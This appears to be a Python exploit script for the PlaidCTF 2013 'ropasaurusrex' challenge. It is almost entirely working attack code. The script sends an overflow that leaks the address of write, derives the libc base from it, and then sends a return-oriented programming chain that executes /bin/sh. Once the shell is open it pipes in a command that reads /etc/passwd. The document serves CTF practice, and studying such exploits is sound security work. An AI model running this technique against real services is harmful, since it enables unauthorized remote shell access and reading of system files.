# http://shell-storm.org/repo/CTF/PlaidCTF-2013/Pwnable/ropasaurusrex-200/

import struct
import subprocess
import sys

base = 0
def padwith(buf, size):
	return buf + 'A' * (size - len(buf))

def gadget(addr_off):
	return struct.pack("<I", (base + (addr_off - 0x17420)))

def uint(v):
	return struct.pack("<I", v)

def addr(a):
	return uint(a)

buf = ""

buf = padwith(buf, 0x100-4*29)

# return address (initial EIP)
buf += addr(0x08048312) # point to write
buf += addr(0x0804841D) # return main
buf += uint(1)
buf += uint(0x08049614) # read the plt for write.
buf += uint(0x1c)


buf = padwith(buf, 0x100)

proc = subprocess.Popen(sys.argv[1], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

proc.stdin.write(buf)

leak = proc.stdout.read(0x1c)

leak = struct.unpack('<I', leak[0:4])
print 'write at: %s' % hex(leak[0])


base = (leak[0] - 0x2BE0) - 0xC0000
print 'libc base: %s' % hex(base)

buf = ""
buf += uint(0)            # the ecx for g2
buf += uint( (0xB + 0x17 - 2) ) # the eax for g2
buf += gadget(0x0010D251) # ret of g2 going to g3:
buf += 'AAAA'             # value for esi of g3
buf += gadget(0x00143242) # g4: add ebx, eax; add eax, 2; ret
buf += gadget(0x0002E3CC) # g7: pop edx; ret
buf += uint(0)            # value of edx for g7
buf += gadget(0x0010A44D) # g6: add al, -0x17, ret
buf += gadget(0x000EA621) # g5: int 0x80
buf += '/bin'
buf += '/sh\x00'
buf += "/bin/bash\x00"

buf = padwith(buf, 0x100-4*29)

# return address (initial EIP)
buf += gadget(0x0002E3CC) # g0: pop edx; ret

buf += gadget(0x000EE100) # value of edx for gadget 0
buf += gadget(0x0002E49D) # g1: mov esp, ecx; jmp edx

buf = padwith(buf, 0x100) # make exactly 256 bytes

proc.stdin.write(buf)

proc.stdin.write('cat /etc/passwd|grep mike;uptime')

print proc.communicate()
